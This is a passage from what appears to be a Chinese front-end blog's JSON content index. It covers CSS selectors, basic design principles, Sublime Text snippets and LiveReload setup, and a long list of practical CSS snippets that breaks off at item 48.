height:40px;&#125;.mainDiv &gt; div&#123;background:green;&#125; 然后我们去掉子代选择器，添加一个后代选择器 123.mainDiv div&#123; background-color: red; &#125; 效果 经过上面的结果展示，我们能得到结论:子代选择器~ 和后代选择（空格）的区别： 子代选择器：只对应用对象的直接相应子节点有效。如实例代码中的儿子div 后代选择器：对应用对象内的所有相应子节点都有效。如实例中的儿子div和孙子div 相邻兄弟选择器 相邻兄弟选择器可选择紧接在另一元素后的元素，且二者有相同父元素 以下实例选取了所有位于 &lt;div&gt; 元素后的第一个 &lt;p&gt; 元素 123456&lt;div&gt; &lt;p&gt;001&lt;/p&gt; &lt;h1&gt;002&lt;/h1&gt; &lt;p&gt;003&lt;/p&gt;&lt;/div&gt; &lt;p&gt;我是通过相邻兄弟选择器选择的元素&lt;/p&gt; 1div + p&#123;background:red;&#125; 效果： 普通相邻兄弟选择器 普通兄弟选择器选取所有指定元素的相邻兄弟元素 12345678&lt;div&gt; &lt;p&gt;001&lt;/p&gt; &lt;h1&gt;002&lt;/h1&gt; &lt;p&gt;003&lt;/p&gt;&lt;/div&gt; &lt;p&gt;我是普通相邻兄弟选择器~选择的&lt;/p&gt;&lt;p&gt;我是普通相邻兄弟选择器~选择的&lt;/p&gt;&lt;p&gt;我是普通相邻兄弟选择器~选择的&lt;/p&gt; 1div ~ p&#123;background:red;&#125; 效果","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://ru23.com/tags/CSS/"}]},{"title":"写给大家看的设计书总结","slug":"2016-08-写给大家看的设计书总结","date":"2016-08-29T08:20:43.000Z","updated":"2018-10-24T03:46:01.868Z","comments":true,"path":"note/f8ea7208.html","link":"","permalink":"https://ru23.com/note/f8ea7208.html","excerpt":"设计四大基本原则","text":"设计四大基本原则 亲密性 亲密性原则是指：将相关的项组织在一起，移动这些项，使它们的物理位置相互靠近，这样一来，相关的项将被看作凝聚为一体的一个组 在一个页面上，物理位置的接近就意味着存在关联 亲密性意味着存在关联 如果多个项之间存在很近的亲密性，他们将成为一个视觉单元，而不是很多孤立的元素 亲密的根本目的：是实现组织性 要避免的问题：避免一个页面上有太多孤立的元素 对齐 对齐原则是指：任何元素都不能在页面上随意安放，每一项应当与页面上的每一个内容存在某种视觉联系 一定要坚持一个原则：页面上只使用一种文本对齐；所有文本都左对齐或右对齐或全部居中对齐 对齐的根本目的：是使页面统一而且有条理 要避免的问题： 要避免在页面上混合使用多种文本对齐方式（也就是说，不要将某些文本居中，而另外一些文本右对齐） 要避免居中对齐，有时可以有意地选择这种对齐样式，但是不要把它作为默认选择 重复 重复原则指出：设计的某些方面需要在整个作品中重复 重复有助于组织信息，这可以帮助读者浏览各个页面，它有助于将设计中单独的部分统一起来 设计中视觉元素的重复可以将作品中的各部分连在一起，从而统一并增强整个作品 根本目的：重复的目的就是统一，并增强视觉效果 要避免的问题：要避免太多地重复一个元素，重复太多会让人讨厌 对比 对比原则指出：如果两个项不完全相同，就应当使之不同，而且应当是截然不同 在页面上增加对比能吸引人的眼球 根本目的：对比的根本目的有两方面，这两个方面相辅相成，无法分开。一个目的是增强页面的效果，另一个目的是有助于信息的组织 要避免的问题：不要犹豫，如果你想形成对比，就加大力度。要避免使用两种或多种类似的字体 （完）","categories":[{"name":"Designed","slug":"Designed","permalink":"https://ru23.com/categories/Designed/"}],"tags":[{"name":"设计","slug":"设计","permalink":"https://ru23.com/tags/设计/"}]},{"title":"学会使用Sublime Text Snippets提高编码速度","slug":"2016-08-学会使用Sublime-Text-Snippets提高编码速度","date":"2016-08-13T14:10:08.000Z","updated":"2018-10-24T03:46:01.870Z","comments":true,"path":"note/e3137a15.html","link":"","permalink":"https://ru23.com/note/e3137a15.html","excerpt":"我们在编写代码的时候，总会遇到一些需要反复使用的代码片段。这时候就需要反复的复制和黏贴，大大影响效率。我们利用Sublime Text的snippet功能，就能很好的解决这一问题。通俗的讲，就是把我们常用的代码分别保存起啦，然后通过插件的形式来反复调用。","text":"我们在编写代码的时候，总会遇到一些需要反复使用的代码片段。这时候就需要反复的复制和黏贴，大大影响效率。我们利用Sublime Text的snippet功能，就能很好的解决这一问题。通俗的讲，就是把我们常用的代码分别保存起啦，然后通过插件的形式来反复调用。 创建方法：Tools &gt; New Snippet 这时你会看到如下示例代码： 123456789&lt;snippet&gt; &lt;content&gt;&lt;![CDATA[Hello, $&#123;1:this&#125; is a $&#123;2:snippet&#125;.]]&gt;&lt;/content&gt; &lt;!-- Optional: Set a tabTrigger to define how to trigger the snippet --&gt; &lt;!-- &lt;tabTrigger&gt;hello&lt;/tabTrigger&gt; --&gt; &lt;!-- Optional: Set a scope to limit where the snippet will trigger --&gt; &lt;!-- &lt;scope&gt;source.python&lt;/scope&gt; --&gt;&lt;/snippet&gt; 我们接着来看下完整的结构和说明 12345678910&lt;snippet&gt; &lt;content&gt;&lt;![CDATA[ 你需要插入的代码片段$&#123;1:name&#125; ]]&gt;&lt;/content&gt; &lt;!-- 可选：快捷键，利用Tab自动补全代码的功能 --&gt; &lt;tabTrigger&gt;xyzzy&lt;/tabTrigger&gt; &lt;!-- 可选：使用范围，不填写代表对所有文件有效。附：source.css和test.html分别对应不同文件。 --&gt; &lt;scope&gt;source.python&lt;/scope&gt; &lt;!-- 可选：在snippet菜单中的显示说明（支持中文）。如果不定义，菜单则显示当前文件的文件名。 --&gt; &lt;description&gt;My Fancy Snippet&lt;/description&gt;&lt;/snippet&gt; ${1:name}表示代码插入后，光标所停留的位置，可同时插入多个。其中:name为自定义参数（可选）。${2}表示代码插入后，按Tab键，光标会根据顺序跳转到相应位置（以此类推） 开始自己动手编写一个实例： 12345678910111213&lt;snippet&gt; &lt;content&gt; &lt;![CDATA[ &lt;footer&gt; &lt;p&gt;Copyright © 2008-2012 $&#123;1:bluesdream&#125;.com&lt;/p&gt; &lt;p&gt;增值电信业务经营许可证 沪B2-$&#123;2&#125; &lt;a href=\"#\"&gt;沪ICP备号$&#123;3&#125;&lt;/a&gt;&lt;/p&gt; &lt;/footer&gt; ]]&gt; &lt;/content&gt; &lt;tabTrigger&gt;cft&lt;/tabTrigger&gt; &lt;description&gt;custom-footer&lt;/description&gt; &lt;scope&gt;text.html&lt;/scope&gt;&lt;/snippet&gt; 创建完毕以后，保存在\\Packages\\User目录下（例 X:\\Sublime Text 2.0\\Data\\Packages\\User），文件命名为cft-code，后缀名.sublime-snippet。 此时我们打开一个html文件，输入cft，再按Tab键，刚才我们所编写的代码段，就插入了进来。并且此时的光标停留在我们所标记的${1}位置处，如果我们再按下Tab，那么光标就跳转到${2}的位置。由于我们在scope中定义了仅在html文件中使用，所以此时如果我们打开的是css或其他格式的文件，那将无法插入代码段。 常用的Sublime Text Snippets","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"sublime","slug":"sublime","permalink":"https://ru23.com/tags/sublime/"}]},{"title":"配置sublime的LiveReload与webstorm的插件实现实时预览","slug":"2016-08-配置sublime的LiveReload与webstorm的插件实现实时预览","date":"2016-08-13T10:20:43.000Z","updated":"2018-10-24T03:46:01.906Z","comments":true,"path":"note/d20d7c40.html","link":"","permalink":"https://ru23.com/note/d20d7c40.html","excerpt":"sublime配置LiveReload插件实现实时预览","text":"sublime配置LiveReload插件实现实时预览 LiveReload是很棒的插件，可以在浏览器中实时预览，但是在Sublime text3里，从Package Control中安装的LiveReload是无法使用的，但是可以选择手动安装解决 Sublime端 直接clone到Packages文件夹 1git clone https://github.com/Grafikart/ST3-LiveReload.git LiveReload 浏览器端 用的是chrome，在应用商店可以直接找到LiveReload，安装 配置 打开sublime Preference&gt;Package Settings&gt;LiveReload&gt;Settings User 123456&#123; &quot;enabled_plugins&quot;: [ &quot;SimpleReloadPlugin&quot;, &quot;SimpleRefresh&quot; ]&#125; 实时预览 把html文件在浏览器中打开，点击一次图标中间的圆环变成原点就代表可以实时预览了。ST3中的文件保存一次，浏览器就会刷新一次，实时预览，很方便 sublime配上美美的透明插件，是不是很酷呢，再也不用来回切换了 透明插件：SublimeTextTrans WebStorm Live Edit与Google浏览器实时无刷新自动加载页面 在WebStorm中是自带Live Edit功能的，只是默认没有开启 Ctrl + Alt + S –&gt; Live Edit–&gt; 勾选Enable live editing，如下图： 接下来就是要在Google浏览器中安装 JetBrains IDE Suport扩展，这里直接给出地址啦 JetBrains IDE Suport 安装好之后在地址栏的右边会有一个JB的小图标 如果单击这个小图标可以切换到WebStorm的页面中 最后，要实现在WebStorm中编辑代码，而不刷新浏览器自动实时更新，需要在WebStorm中开启Debug模式打开页面，直接在Project面板右击页面选择Debug就行啦 一切OK，现在在WebStorm修改，然后切换到chrome查看一下，是不是已经同步过来啦；浏览器上面的黄色背景提示条一定不能关闭，关闭了就不会实时同步啦","categories":[{"name":"工欲善其事必先利其器","slug":"工欲善其事必先利其器","permalink":"https://ru23.com/categories/工欲善其事必先利其器/"}],"tags":[{"name":"sublime","slug":"sublime","permalink":"https://ru23.com/tags/sublime/"},{"name":"webstorm","slug":"webstorm","permalink":"https://ru23.com/tags/webstorm/"}]},{"title":"实用的60个CSS代码片段","slug":"2016-08-实用的60个CSS代码片段","date":"2016-08-13T04:25:08.000Z","updated":"2018-10-24T03:46:01.904Z","comments":true,"path":"note/4ffb583.html","link":"","permalink":"https://ru23.com/note/4ffb583.html","excerpt":"1、垂直对齐 如果你用CSS，则你会有困惑：我该怎么垂直对齐容器中的元素？现在，利用CSS3的Transform，可以很优雅的解决这个困惑： 1234567.verticalcenter&#123; position: relative; top: 50%; -webkit-transform: translateY(-50%); -o-transform: translateY(-50%); transform: translateY(-50%);&#125; 使用这个技巧，从单行文本、段落到box，都会垂直对齐。目前浏览器对Transform的支持是需要关注的，Chrome 4, Opera 10, Safari 3, Firefox 3, and Internet Explorer 9均支持该属性","text":"1、垂直对齐 如果你用CSS，则你会有困惑：我该怎么垂直对齐容器中的元素？现在，利用CSS3的Transform，可以很优雅的解决这个困惑： 1234567.verticalcenter&#123; position: relative; top: 50%; -webkit-transform: translateY(-50%); -o-transform: translateY(-50%); transform: translateY(-50%);&#125; 使用这个技巧，从单行文本、段落到box，都会垂直对齐。目前浏览器对Transform的支持是需要关注的，Chrome 4, Opera 10, Safari 3, Firefox 3, and Internet Explorer 9均支持该属性 2、伸展一个元素到窗口高度 在具体场景中，你可能想要将一个元素伸展到窗口高度，基本元素的调整只能调整容器的大小,因此要使一个元素伸展到窗口高度，我们需要伸展顶层元素：html和body: 1234html, body &#123; height: 100%;&#125; 然后将100%应用到任何元素的高 123div &#123; height: 100%;&#125; 3、基于文件格式使用不同的样式 为了更容易知道链接的目标，有时你想让一些链接看起来和其它的不同。下面的片段在文本链接前添加一个图标，对不同的资源使用不同的图标或图片： 123456789101112131415a[href^=\"http://\"]&#123; padding-right: 20px; background: url(external.gif) no-repeat center right;&#125;/* emails */a[href^=\"mailto:\"]&#123; padding-right: 20px; background: url(email.png) no-repeat center right;&#125;/* pdfs */a[href$=\".pdf\"]&#123; padding-right: 20px; background: url(pdf.png) no-repeat center right;&#125; 效果演示 4、创建跨浏览器的图像灰度 灰度有时看起来简约和优雅，能为网站呈现更深层次的色调。在示例中，我们将对一个SVG图像添加灰度过滤： 12345&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt; &lt;filter id=&quot;grayscale&quot;&gt; &lt;feColorMatrix type=&quot;matrix&quot; values=&quot;0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0&quot;/&gt; &lt;/filter&gt;&lt;/svg&gt; 为了跨浏览器，会用到filter属性： 12345img &#123; filter: url(filters.svg#grayscale); /* Firefox 3.5+ */ filter: gray; /* IE6-9 */ -webkit-filter: grayscale(1); /* Google Chrome, Safari 6+ &amp; Opera 15+ */&#125; 5、背景渐变动画 CSS中最具诱惑的一个功能是能添加动画效果，除了渐变，你可以给背景色、透明度、元素大小添加动画。目前，你不能为渐变添加动画，但下面的代码可能有帮助。它通过改变背景位置，让它看起来有动画效果。 123456789button &#123; background-image: linear-gradient(#5187c4, #1c2f45); background-size: auto 200%; background-position: 0 100%; transition: background-position 0.5s;&#125; button:hover &#123; background-position: 0 0;&#125; 效果演示： 6、CSS：表格列宽自适用 对于表格，当谈到调整列宽时，是比较痛苦的。然后，这里有一个可以使用的技巧：给td元素添加white-space: nowrap;能让文本正确的换行 123td &#123; white-space: nowrap;&#125; 演示 7、只在一边或两边显示盒子阴影 如果你要一个盒阴影，试试这个技巧，能为任一边添加阴影。为了实现这个，首先定义一个有具体宽高的盒子，然后正确定位:after伪类。实现底边阴影的代码如下 123456789101112131415161718192021222324.box-shadow &#123; background-color: #FF8020; width: 160px; height: 90px; margin-top: -45px; margin-left: -80px; position: absolute; top: 50%; left: 50%;&#125;.box-shadow:after &#123; content: \"\"; width: 150px; height: 1px; margin-top: 88px; margin-left: -75px; display: block; position: absolute; left: 50%; z-index: -1; -webkit-box-shadow: 0px 0px 8px 2px #000000; -moz-box-shadow: 0px 0px 8px 2px #000000; box-shadow: 0px 0px 8px 2px #000000;&#125; 演示 8、包裹长文本 如果你碰到一个比自身容器长的文本，这个技巧对你很有用。在这个示例中，默认时，不管容器的宽度，文本都将水平填充。 简单的CSS代码就能在容器中调整文本： 1234pre &#123; white-space: pre-line; word-wrap: break-word;&#125; 效果看起来如下： 9、制造模糊文本 想要让文本模糊？可以使用color透明和text-shadow实现 1234.blurry-text &#123; color: transparent; text-shadow: 0 0 5px rgba(0,0,0,0.5);&#125; 演示 10、用CSS动画实现省略号动画 这个片段将帮助你制造一个ellipsis的动画，对于简单的加载状态是很有用的，而不用去使用gif图像。 123456789101112131415.loading:after &#123; overflow: hidden; display: inline-block; vertical-align: bottom; animation: ellipsis 2s infinite; content: \"\\2026\"; /* ascii code for the ellipsis character */&#125;@keyframes ellipsis &#123; from &#123; width: 2px; &#125; to &#123; width: 15px; &#125;&#125; 演示 11、样式重置 12345678910111213141516171819202122html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video &#123; margin: 0; padding: 0; border: 0; font-size: 100%; font: inherit; vertical-align: baseline; outline: none; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box;&#125;html &#123; height: 101%; &#125;body &#123; font-size: 62.5%; line-height: 1; font-family: Arial, Tahoma, sans-serif; &#125;article, aside, details, figcaption, figure, footer, header, hgroup, menu, nav, section &#123; display: block; &#125;ol, ul &#123; list-style: none; &#125;blockquote, q &#123; quotes: none; &#125;blockquote:before, blockquote:after, q:before, q:after &#123; content: ''; content: none; &#125;strong &#123; font-weight: bold; &#125; table &#123; border-collapse: collapse; border-spacing: 0; &#125;img &#123; border: 0; max-width: 100%; &#125;p &#123; font-size: 1.2em; line-height: 1.0em; color: #333; &#125; 12、典型的CSS清除浮动 1234.clearfix:after &#123; content: \".\"; display: block; clear: both; visibility: hidden; line-height: 0; height: 0; &#125;.clearfix &#123; display: inline-block; &#125;html[xmlns] .clearfix &#123; display: block; &#125;* html .clearfix &#123; height: 1%; &#125; 13、新版清除浮动（2011） 1234.clearfix:before, .container:after &#123; content: \"\"; display: table; &#125;.clearfix:after &#123; clear: both; &#125;/* IE 6/7 */.clearfix &#123; zoom: 1; &#125; 14、跨浏览器的透明 123456.transparent &#123; filter: alpha(opacity=50); /* internet explorer */ -khtml-opacity: 0.5; /* khtml, old safari */ -moz-opacity: 0.5; /* mozilla, netscape */ opacity: 0.5; /* fx, safari, opera */&#125; 15、CSS引用模板 123456789101112131415161718blockquote &#123; background: #f9f9f9; border-left: 10px solid #ccc; margin: 1.5em 10px; padding: .5em 10px; quotes: \"\\201C\"\"\\201D\"\"\\2018\"\"\\2019\";&#125;blockquote:before &#123; color: #ccc; content: open-quote; font-size: 4em; line-height: .1em; margin-right: .25em; vertical-align: -.4em;&#125;blockquote p &#123; display: inline;&#125; 16、个性圆角 1234567891011121314151617#container &#123; -webkit-border-radius: 4px 3px 6px 10px; -moz-border-radius: 4px 3px 6px 10px; -o-border-radius: 4px 3px 6px 10px; border-radius: 4px 3px 6px 10px;&#125;/* alternative syntax broken into each line */#container &#123; -webkit-border-top-left-radius: 4px; -webkit-border-top-right-radius: 3px; -webkit-border-bottom-right-radius: 6px; -webkit-border-bottom-left-radius: 10px; -moz-border-radius-topleft: 4px; -moz-border-radius-topright: 3px; -moz-border-radius-bottomright: 6px; -moz-border-radius-bottomleft: 10px;&#125; 17、通用媒体查询 12345678910111213141516171819202122232425262728293031323334353637/* Smartphones (portrait and landscape) ----------- */@media only screen and (min-device-width : 320px) and (max-device-width : 480px) &#123; /* Styles */&#125;/* Smartphones (landscape) ----------- */@media only screen and (min-width : 321px) &#123; /* Styles */&#125;/* Smartphones (portrait) ----------- */@media only screen and (max-width : 320px) &#123; /* Styles */&#125;/* iPads (portrait and landscape) ----------- */@media only screen and (min-device-width : 768px) and (max-device-width : 1024px) &#123; /* Styles */&#125;/* iPads (landscape) ----------- */@media only screen and (min-device-width : 768px) and (max-device-width : 1024px) and (orientation : landscape) &#123; /* Styles */&#125;/* iPads (portrait) ----------- */@media only screen and (min-device-width : 768px) and (max-device-width : 1024px) and (orientation : portrait) &#123; /* Styles */&#125;/* Desktops and laptops ----------- */@media only screen and (min-width : 1224px) &#123; /* Styles */&#125;/* Large screens ----------- */@media only screen and (min-width : 1824px) &#123; /* Styles */&#125;/* iPhone 4 ----------- */@media only screen and (-webkit-min-device-pixel-ratio:1.5), only screen and (min-device-pixel-ratio:1.5) &#123; /* Styles */&#125; 18、现代字体栈 12345678910111213141516/* Times New Roman-based serif */font-family: Cambria, \"Hoefler Text\", Utopia, \"Liberation Serif\", \"Nimbus Roman No9 L Regular\", Times, \"Times New Roman\", serif;/* A modern Georgia-based serif */font-family: Constantia, \"Lucida Bright\", Lucidabright, \"Lucida Serif\", Lucida, \"DejaVu Serif,\" \"Bitstream Vera Serif\", \"Liberation Serif\", Georgia, serif;/*A more traditional Garamond-based serif */font-family: \"Palatino Linotype\", Palatino, Palladio, \"URW Palladio L\", \"Book Antiqua\", Baskerville, \"Bookman Old Style\", \"Bitstream Charter\", \"Nimbus Roman No9 L\", Garamond, \"Apple Garamond\", \"ITC Garamond Narrow\", \"New Century Schoolbook\", \"Century Schoolbook\", \"Century Schoolbook L\", Georgia, serif;/*The Helvetica/Arial-based sans serif */font-family: Frutiger, \"Frutiger Linotype\", Univers, Calibri, \"Gill Sans\", \"Gill Sans MT\", \"Myriad Pro\", Myriad, \"DejaVu Sans Condensed\", \"Liberation Sans\", \"Nimbus Sans L\", Tahoma, Geneva, \"Helvetica Neue\", Helvetica, Arial, sans-serif;/*The Verdana-based sans serif */font-family: Corbel, \"Lucida Grande\", \"Lucida Sans Unicode\", \"Lucida Sans\", \"DejaVu Sans\", \"Bitstream Vera Sans\", \"Liberation Sans\", Verdana, \"Verdana Ref\", sans-serif;/*The Trebuchet-based sans serif */font-family: \"Segoe UI\", Candara, \"Bitstream Vera Sans\", \"DejaVu Sans\", \"Bitstream Vera Sans\", \"Trebuchet MS\", Verdana, \"Verdana Ref\", sans-serif;/*The heavier \"Impact\" sans serif */font-family: Impact, Haettenschweiler, \"Franklin Gothic Bold\", Charcoal, \"Helvetica Inserat\", \"Bitstream Vera Sans Bold\", \"Arial Black\", sans-serif;/*The monospace */font-family: Consolas, \"Andale Mono WT\", \"Andale Mono\", \"Lucida Console\", \"Lucida Sans Typewriter\", \"DejaVu Sans Mono\", \"Bitstream Vera Sans Mono\", \"Liberation Mono\", \"Nimbus Mono L\", Monaco, \"Courier New\", Courier, monospace; 19、自定义文本选择 123::selection &#123; background: #e2eae2; &#125;::-moz-selection &#123; background: #e2eae2; &#125;::-webkit-selection &#123; background: #e2eae2; &#125; 20、为logo隐藏H1 1234567h1 &#123; text-indent: -9999px; margin: 0 auto; width: 320px; height: 85px; background: transparent url(\"images/logo.png\") no-repeat scroll;&#125; 21、图片边框偏光 12345678910img.polaroid &#123; background:#000; /*Change this to a background image or remove*/ border:solid #fff; border-width:6px 6px 20px 6px; box-shadow:1px 1px 5px #333; /* Standard blur at 5px. Increase for more depth */ -webkit-box-shadow:1px 1px 5px #333; -moz-box-shadow:1px 1px 5px #333; height:200px; /*Set to height of your image or desired div*/ width:200px; /*Set to width of your image or desired div*/&#125; 22、锚链接伪类 1234a:link &#123; color: blue; &#125;a:visited &#123; color: purple; &#125;a:hover &#123; color: red; &#125;a:active &#123; color: yellow; &#125; 23、奇特的CSS引用 1234567891011121314151617181920212223242526272829303132.has-pullquote:before &#123; /* Reset metrics. */ padding: 0; border: none; /* Content */ content: attr(data-pullquote); /* Pull out to the right, modular scale based margins. */ float: right; width: 320px; margin: 12px -140px 24px 36px; /* Baseline correction */ position: relative; top: 5px; /* Typography (30px line-height equals 25% incremental leading) */ font-size: 23px; line-height: 30px;&#125;.pullquote-adelle:before &#123; font-family: \"adelle-1\", \"adelle-2\"; font-weight: 100; top: 10px !important;&#125;.pullquote-helvetica:before &#123; font-family: \"Helvetica Neue\", Arial, sans-serif; font-weight: bold; top: 7px !important;&#125;.pullquote-facit:before &#123; font-family: \"facitweb-1\", \"facitweb-2\", Helvetica, Arial, sans-serif; font-weight: bold; top: 7px !important;&#125; 24、CSS3：全屏背景 1234567html &#123; background: url('images/bg.jpg') no-repeat center center fixed; -webkit-background-size: cover; -moz-background-size: cover; -o-background-size: cover; background-size: cover;&#125; 25、内容垂直居中 12345.container &#123; min-height: 6.5em; display: table-cell; vertical-align: middle;&#125; 26、强制出现垂直滚动条 1html &#123; height: 101% &#125; 27、CSS3渐变模板 123456789#colorbox &#123; background: #629721; background-image: -webkit-gradient(linear, left top, left bottom, from(#83b842), to(#629721)); background-image: -webkit-linear-gradient(top, #83b842, #629721); background-image: -moz-linear-gradient(top, #83b842, #629721); background-image: -ms-linear-gradient(top, #83b842, #629721); background-image: -o-linear-gradient(top, #83b842, #629721); background-image: linear-gradient(top, #83b842, #629721);&#125; 28、@font-face模板 1234567891011@font-face &#123; font-family: 'MyWebFont'; src: url('webfont.eot'); /* IE9 Compat Modes */ src: url('webfont.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */ url('webfont.woff') format('woff'), /* Modern Browsers */ url('webfont.ttf') format('truetype'), /* Safari, Android, iOS */ url('webfont.svg#svgFontName') format('svg'); /* Legacy iOS */&#125;body &#123; font-family: 'MyWebFont', Arial, sans-serif;&#125; 29、缝合CSS3元素 123456789101112131415161718192021222324252627282930313233p &#123; position:relative; z-index:1; padding: 10px; margin: 10px; font-size: 21px; line-height: 1.3em; color: #fff; background: #ff0030; -webkit-box-shadow: 0 0 0 4px #ff0030, 2px 1px 4px 4px rgba(10,10,0,.5); -moz-box-shadow: 0 0 0 4px #ff0030, 2px 1px 4px 4px rgba(10,10,0,.5); box-shadow: 0 0 0 4px #ff0030, 2px 1px 6px 4px rgba(10,10,0,.5); -webkit-border-radius: 3px; -moz-border-radius: 3px; border-radius: 3px;&#125;p:before &#123; content: \"\"; position: absolute; z-index: -1; top: 3px; bottom: 3px; left :3px; right: 3px; border: 2px dashed #fff;&#125;p a &#123; color: #fff; text-decoration:none;&#125;p a:hover, p a:focus, p a:active &#123; text-decoration:underline;&#125; 30、CSS3 斑马线 123tbody tr:nth-child(odd) &#123; background-color: #ccc;&#125; 31、有趣的&amp; 12345.amp &#123; font-family: Baskerville, 'Goudy Old Style', Palatino, 'Book Antiqua', serif; font-style: italic; font-weight: normal;&#125; 32、大字段落 12345678p:first-letter&#123; display: block; margin: 5px 0 0 5px; float: left; color: #ff3366; font-size: 5.4em; font-family: Georgia, Times New Roman, serif;&#125; 33、内部CSS3 盒阴影 12345#mydiv &#123; -moz-box-shadow: inset 2px 0 4px #000; -webkit-box-shadow: inset 2px 0 4px #000; box-shadow: inset 2px 0 4px #000;&#125; 34、外部CSS3 盒阴影 12345#mydiv &#123; -webkit-box-shadow: 0 2px 2px -2px rgba(0, 0, 0, 0.52); -moz-box-shadow: 0 2px 2px -2px rgba(0, 0, 0, 0.52); box-shadow: 0 2px 2px -2px rgba(0, 0, 0, 0.52);&#125; 35、三角形列表项目符号 1234567891011121314151617ul &#123; margin: 0.75em 0; padding: 0 1em; list-style: none;&#125;li:before &#123; content: \"\"; border-color: transparent #111; border-style: solid; border-width: 0.35em 0 0.35em 0.45em; display: block; height: 0; width: 0; left: -1em; top: 0.9em; position: relative;&#125; 36、固定宽度的居中布局 1234#page-wrap &#123; width: 800px; margin: 0 auto;&#125; 37、CSS3 列文本 123456789#columns-3 &#123; text-align: justify; -moz-column-count: 3; -moz-column-gap: 12px; -moz-column-rule: 1px solid #c4c8cc; -webkit-column-count: 3; -webkit-column-gap: 12px; -webkit-column-rule: 1px solid #c4c8cc;&#125; 38、CSS固定页脚 12345678910111213#footer &#123; position: fixed; left: 0px; bottom: 0px; height: 30px; width: 100%; background: #444;&#125;/* IE 6 */* html #footer &#123; position: absolute; top: expression((0-(footer.offsetHeight)+(document.documentElement.clientHeight ? document.documentElement.clientHeight : document.body.clientHeight)+(ignoreMe = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop))+'px');&#125; 39、IE6的PNG透明修复 12345678910111213141516.bg &#123; width:200px; height:100px; background: url(/folder/yourimage.png) no-repeat; _background:none; _filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='/folder/yourimage.png',sizingMethod='crop');&#125;/* 1px gif method */img, .png &#123; position: relative; behavior: expression((this.runtimeStyle.behavior=\"none\")&amp;&amp;(this.pngSet?this.pngSet=true:(this.nodeName == \"IMG\" &amp;&amp; this.src.toLowerCase().indexOf('.png')&gt;-1?(this.runtimeStyle.backgroundImage = \"none\", this.runtimeStyle.filter = \"progid:DXImageTransform.Microsoft.AlphaImageLoader(src='\" + this.src + \"', sizingMethod='image')\", this.src = \"images/transparent.gif\"):(this.origBg = this.origBg? this.origBg :this.currentStyle.backgroundImage.toString().replace('url(\"','').replace('\")',''), this.runtimeStyle.filter = \"progid:DXImageTransform.Microsoft.AlphaImageLoader(src='\" + this.origBg + \"', sizingMethod='crop')\", this.runtimeStyle.backgroundImage = \"none\")),this.pngSet=true));&#125; 40、跨浏览器设置最小高度 12345#container &#123; min-height: 550px; height: auto !important; height: 550px;&#125; 41、CSS3 鲜艳的输入 12345678910111213141516input[type=text], textarea &#123; -webkit-transition: all 0.30s ease-in-out; -moz-transition: all 0.30s ease-in-out; -ms-transition: all 0.30s ease-in-out; -o-transition: all 0.30s ease-in-out; outline: none; padding: 3px 0px 3px 3px; margin: 5px 1px 3px 0px; border: 1px solid #ddd;&#125;input[type=text]:focus, textarea:focus &#123; box-shadow: 0 0 5px rgba(81, 203, 238, 1); padding: 3px 0px 3px 3px; margin: 5px 1px 3px 0px; border: 1px solid rgba(81, 203, 238, 1);&#125; 42、基于文件类型的链接样式 123456789101112131415/* external links */a[href^=\"http://\"] &#123; padding-right: 13px; background: url('external.gif') no-repeat center right;&#125;/* emails */a[href^=\"mailto:\"] &#123; padding-right: 20px; background: url('email.png') no-repeat center right;&#125;/* pdfs */a[href$=\".pdf\"] &#123; padding-right: 18px; background: url('acrobat.png') no-repeat center right;&#125; 43、强制换行 1234567pre &#123; white-space: pre-wrap; /* css-3 */ white-space: -moz-pre-wrap; /* Mozilla, since 1999 */ white-space: -pre-wrap; /* Opera 4-6 */ white-space: -o-pre-wrap; /* Opera 7 */ word-wrap: break-word; /* Internet Explorer 5.5+ */&#125; 44、在可点击的项目上强制手型 123a[href], input[type='submit'], input[type='image'], label[for], select, button, .pointer &#123; cursor: pointer;&#125; 45、网页顶部盒阴影 123456789101112body:before &#123; content: \"\"; position: fixed; top: -10px; left: 0; width: 100%; height: 10px; -webkit-box-shadow: 0px 0px 10px rgba(0,0,0,.8); -moz-box-shadow: 0px 0px 10px rgba(0,0,0,.8); box-shadow: 0px 0px 10px rgba(0,0,0,.8); z-index: 100;&#125; 46、CSS3对话气泡 123456789101112131415161718192021222324252627282930313233343536.chat-bubble &#123; background-color: #ededed; border: 2px solid #666; font-size: 35px; line-height: 1.3em; margin: 10px auto; padding: 10px; position: relative; text-align: center; width: 300px; -moz-border-radius: 20px; -webkit-border-radius: 20px; -moz-box-shadow: 0 0 5px #888; -webkit-box-shadow: 0 0 5px #888; font-family: 'Bangers', arial, serif; &#125;.chat-bubble-arrow-border &#123; border-color: #666 transparent transparent transparent; border-style: solid; border-width: 20px; height: 0; width: 0; position: absolute; bottom: -42px; left: 30px;&#125;.chat-bubble-arrow &#123; border-color: #ededed transparent transparent transparent; border-style: solid; border-width: 20px; height: 0; width: 0; position: absolute; bottom: -39px; left: 30px;&#125; 47、H1-H5默认样式 1234567891011121314151617181920212223h1,h2,h3,h4,h5&#123; color: #005a9c;&#125;h1&#123; font-size: 2.6em; line-height: 2.45em;&#125;h2&#123; font-size: 2.1em; line-height: 1.9em;&#125;h3&#123; font-size: 1.8em; line-height: 1.65em;&#125;h4&#123; font-size: 1.65em; line-height: 1.4em;&#125;h5&#123; font-size: 1.4em; line-height: 1.25em;&#125; 48、纯CSS背景噪音 1234body &#123; background-image: 